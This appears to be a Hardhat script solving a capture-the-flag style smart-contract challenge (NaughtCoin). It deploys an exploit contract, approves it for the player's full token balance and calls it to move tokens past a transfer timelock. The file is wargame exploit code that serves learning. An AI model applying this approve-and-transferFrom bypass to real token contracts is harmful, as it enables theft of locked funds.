import { ethers } from 'hardhat'
import { IERC20 } from '../types/typechain/IERC20'
import { ExploitNaughtCoin } from '../types/typechain/ExploitNaughtCoin'

async function main() {
  const targetAddr = '0x7d961c419e642e9014BC0156588373f1c62466b2'
  const attackerAddress = '0x21db76B75db2f5d4f9505Eae7d8cE53eB9AEd2B5'

  const coinFac = await ethers.getContractFactory('NaughtCoin')
  const coin = coinFac.attach(targetAddr) as IERC20

  const factory = await ethers.getContractFactory('ExploitNaughtCoin')
  const exploit = (await factory.deploy()) as ExploitNaughtCoin

  console.log('Deploying contract...')
  await exploit.deployed()

  console.log('Contract deployed, executing exploit...')
  await coin.approve(exploit.address, await coin.balanceOf(attackerAddress), {
    gasLimit: 800000
  })
  await exploit.execute(coin.address, {
    gasLimit: 800000
  })

  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
